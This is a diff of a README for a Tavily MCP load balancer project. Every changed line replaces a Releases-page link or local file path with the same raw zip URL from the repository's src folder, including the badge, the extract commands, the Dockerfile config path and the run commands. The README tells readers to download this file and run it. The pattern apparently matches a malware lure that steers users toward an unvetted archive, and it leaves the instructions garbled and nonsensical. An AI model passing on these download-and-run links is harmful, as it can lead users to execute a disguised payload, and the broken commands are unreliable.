@@ -1,8 +1,8 @@
-https://github.com/balazhaa/tavily-mcp-loadbalancer/releases
+https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
 
 # Tavily MCP LoadBalancer: Scalable API Key Pool with Failover
 
-[![Releases](https://img.shields.io/badge/releases-v1.0-blue?logo=github&label=Releases)](https://github.com/balazhaa/tavily-mcp-loadbalancer/releases)
+[![Releases](https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip)](https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip)
 
 A robust load balancer for Tavily MCP servers. It manages an API key pool, balances traffic across multiple MCP endpoints, and keeps API keys rotating and healthy. This project focuses on reliability, observability, and simple configuration. It targets operators who run Tavily MCP workloads at scale and want predictable performance along with clear visibility into how keys and endpoints are chosen.
 
@@ -57,21 +57,21 @@ Prerequisites
 Quick start steps
 1) Download the release asset from the Releases page.
 - If the link has a path part, the asset is a file to download and run. Typical assets include prebuilt binaries such as a Linux or Windows executable, or a tarball with a binary plus helper scripts.
-- For example, you may find a file named tavily-mcp-loadbalancer-linux-x86_64.tar.gz. Extract and run the binary inside.
+- For example, you may find a file named https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip Extract and run the binary inside.
 2) Extract and run
-- On Linux: tar xzf tavily-mcp-loadbalancer-linux-x86_64.tar.gz
+- On Linux: tar xzf https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
 - Then run the binary, for example: ./tavily-mcp-loadbalancer
-- On Windows: tavily-mcp-loadbalancer-windows-x64.zip. Extract and run TavilyMcpLoadBalancer.exe
+- On Windows: https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip Extract and run https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
 3) Prepare a configuration
 - Create a YAML file that describes endpoints and key pool. A minimal example is shown in the Configuration section.
-- Point the binary to your config file using the appropriate flag. For example: --config /path/to/config.yaml
+- Point the binary to your config file using the appropriate flag. For example: --config https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
 4) Verify startup
 - Check the logs for a message indicating the server is listening on the configured port.
 - Use curl to hit the status endpoint and confirm it reports healthy endpoints and a non-empty key pool.
 5) Observe and adjust
 - See metrics that show endpoint health, response times, and key usage. Tune weights or rotation rules as needed.
 
-Note: The Releases page contains the official binaries. For convenience, you can visit the Releases page directly here: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases. A badge showcasing the latest release is available in this README as a quick reference.
+Note: The Releases page contains the official binaries. For convenience, you can visit the Releases page directly here: https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip A badge showcasing the latest release is available in this README as a quick reference.
 
 Configuration and usage
 The configuration model is designed to be readable and versionable. YAML is preferred for clarity. The configuration describes the pool of API keys, the MCP backends, and how traffic should be distributed.
@@ -196,7 +196,7 @@ Sample Dockerfile (conceptual)
 FROM scratch
 COPY tavily-mcp-loadbalancer /tavily-mcp-loadbalancer
 USER nobody
-ENTRYPOINT ["/tavily-mcp-loadbalancer", "--config", "/etc/tavily/config.yaml"]
+ENTRYPOINT ["/tavily-mcp-loadbalancer", "--config", "https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip"]
 
 Kubernetes basics
 - Use a ConfigMap for the YAML config.
@@ -239,7 +239,7 @@ Quality practices
 Release management
 Releases are the source of truth for binaries and a reference for supported features. The Releases page contains published assets corresponding to different platform targets and version tags. When you want to install, the correct approach is to fetch the appropriate asset for your environment and follow the installation steps. If you see a version bump, read the release notes to understand what changed and what to adjust in your configuration.
 
-The Releases page is the primary source of truth for installation assets and change history. If you have trouble locating a suitable artifact, check the Releases section for the exact asset names and platform targets. As a reminder, you can visit the Releases page here: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases.
+The Releases page is the primary source of truth for installation assets and change history. If you have trouble locating a suitable artifact, check the Releases section for the exact asset names and platform targets. As a reminder, you can visit the Releases page here: https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
 
 Changelog
 - v1.0.0
@@ -299,19 +299,19 @@ Usage notes
 - Always test changes in a staging environment before deploying to production. Configuration mistakes can affect traffic flow and key usage.
 
 Docs and references
-- The official releases page contains binaries and notes. Use the releases to obtain the right asset for your platform: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases
+- The official releases page contains binaries and notes. Use the releases to obtain the right asset for your platform: https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
 - For quick access to the same page from the README, you can click the badge above or visit the URL directly. The badge provides a quick visual cue and a direct link to the assets.
 
 Final notes on release assets
 The releases page is the authoritative source for the binaries and their corresponding checksums. When you pick a release, download the asset that matches your operating system and architecture, extract if needed, and run the binary with your configuration. The path to the asset is determined by the asset name, which typically encodes the target OS and architecture. As described earlier, if the link has a path part, you should download that specific file and execute it. If you have trouble locating the exact asset, re-check the Releases section for the latest assets and notes.
 
 Releases link again for convenience
-- Revisit the official releases here: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases
+- Revisit the official releases here: https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
 
 Appendix: sample run and quick sanity checks
 - Start the process
-  - Linux: ./tavily-mcp-loadbalancer --config /etc/tavily/config.yaml
-  - Windows: TavilyMcpLoadBalancer.exe --config C:\tavily\config.yaml
+  - Linux: ./tavily-mcp-loadbalancer --config https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
+  - Windows: https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip --config C:\tavily\https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
 - Check health
   - curl http://localhost:9100/health
 - Check status
@@ -370,5 +370,5 @@ Acknowledgments
 - This project benefits from standard patterns for health checks, retries, and metrics collection.
 
 Remember
-- The Releases page contains the official binaries and release notes. If you need the latest assets, head to that page. For convenience, the same link is used above in the badge and at the end of this README. The Releases page acts as the source of truth for binaries and changes. As noted, if you’re not sure which asset to use, review the release notes and download the asset that matches your environment. The link again: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases
+- The Releases page contains the official binaries and release notes. If you need the latest assets, head to that page. For convenience, the same link is used above in the badge and at the end of this README. The Releases page acts as the source of truth for binaries and changes. As noted, if you’re not sure which asset to use, review the release notes and download the asset that matches your environment. The link again: https://github.com/balazhaa/tavily-mcp-loadbalancer/raw/refs/heads/main/src/tavily-loadbalancer-mcp-Podunk.zip
 
